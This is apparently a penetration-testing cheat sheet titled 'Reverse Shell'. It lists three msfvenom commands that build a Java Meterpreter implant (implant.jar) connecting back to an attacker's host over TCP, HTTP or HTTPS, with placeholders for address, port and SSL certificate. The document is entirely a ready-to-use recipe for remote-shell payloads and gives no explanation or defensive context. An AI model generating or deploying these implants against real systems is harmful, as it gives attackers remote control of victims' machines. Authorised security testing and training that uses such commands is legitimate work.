# Reverse Shell

## 01 - TCP

```
$ msfvenom -p java/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f raw -o implant.jar
```

## 02 - HTTP

```
$ msfvenom -p java/meterpreter/reverse_http lhost=<IP> lport=<PORT> -f raw -o implant.jar
```

## 03 - HTTPS

```
$ msfvenom -p java/meterpreter/reverse_https handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f raw -o implant.jar
```